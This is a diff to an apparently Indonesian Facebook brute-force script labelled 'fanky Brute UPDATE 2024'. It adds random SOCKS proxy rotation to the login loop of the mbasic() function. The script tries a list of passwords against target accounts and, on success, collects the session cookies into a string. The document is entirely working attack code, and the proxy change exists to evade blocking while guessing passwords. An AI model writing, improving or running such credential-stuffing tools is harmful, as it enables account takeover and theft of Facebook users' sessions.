@@ -135,7 +135,7 @@ sys.stdout.write("\x1b]2; BMBF | fanky Brute UPDATE 2024\x07")
 # ------------------[ MENCARI-PROXY ]-------------------#
 try:
     prox = requests.get(
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
+        "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text"
     ).text
     open(".prox.txt", "w").write(prox)
 except Exception as e:
@@ -1455,6 +1455,9 @@ def mbasic(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
+			if 'ya' in ualuh: ua = ualu[0]
+			nip = random.choice(prox)
+			proxs = {'http': 'socks5://' + nip}
 			headers = {
 				'authority': 'mbasic.facebook.com',
 				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -1476,7 +1479,7 @@ def mbasic(idf,pwv):
 				'user-agent': ua,
 				'viewport-width': '980',
 			}
-			link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers=headers).text
+			link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers=headers,proxies=proxs).text
 			headers = {
 				'authority': 'mbasic.facebook.com',
 				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -1519,7 +1522,7 @@ def mbasic(idf,pwv):
 				"login":"Masuk",
 				"bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link)).group(1),
 			}
-			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',headers=headers,params=params,data=data)
+			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',headers=headers,params=params,data=data,proxies=proxs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
